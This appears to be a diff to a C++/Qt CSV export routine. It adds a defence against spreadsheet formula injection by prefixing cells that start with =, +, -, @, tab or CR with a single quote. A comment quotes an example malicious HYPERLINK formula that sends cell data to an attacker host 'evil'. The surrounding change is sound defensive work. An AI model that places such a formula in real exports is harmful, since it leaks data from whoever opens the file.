@@ -20,11 +20,28 @@
 // RFC 4180 sec 2.6: a field containing comma, double-quote, CR, or LF must
 // be enclosed in double-quotes. Bare CR matters because some downstream
 // parsers (and Excel) treat CR as a row separator.
+//
+// Formula-injection defence: Excel / LibreOffice / Google Sheets treat any
+// cell value starting with =, +, -, @, CR or TAB as a formula. A malicious
+// task content like `=HYPERLINK("http://evil/?d="&A1,"click")` arriving via
+// sync would then execute on export-open. Prefix such cells with a single
+// quote so the spreadsheet keeps the literal text. The quote sits *inside*
+// the (possibly quoted) field and is invisible in the cell, but parsers
+// that don't honour it still get a readable string.
 static QString csvEscape(const QString &s) {
-    if (s.contains(QChar(',')) || s.contains(QChar('"'))
-            || s.contains(QChar('\n')) || s.contains(QChar('\r')))
-        return QStringLiteral("\"%1\"").arg(QString(s).replace(QChar('"'), QStringLiteral("\"\"")));
-    return s;
+    QString out = s;
+    if (!out.isEmpty()) {
+        const QChar c0 = out.front();
+        if (c0 == QLatin1Char('=') || c0 == QLatin1Char('+')
+                || c0 == QLatin1Char('-') || c0 == QLatin1Char('@')
+                || c0 == QLatin1Char('\t') || c0 == QLatin1Char('\r')) {
+            out.prepend(QLatin1Char('\''));
+        }
+    }
+    if (out.contains(QChar(',')) || out.contains(QChar('"'))
+            || out.contains(QChar('\n')) || out.contains(QChar('\r')))
+        return QStringLiteral("\"%1\"").arg(out.replace(QChar('"'), QStringLiteral("\"\"")));
+    return out;
 }
 
 // Pick a path that does not yet exist on disk. If `desired` is free, return
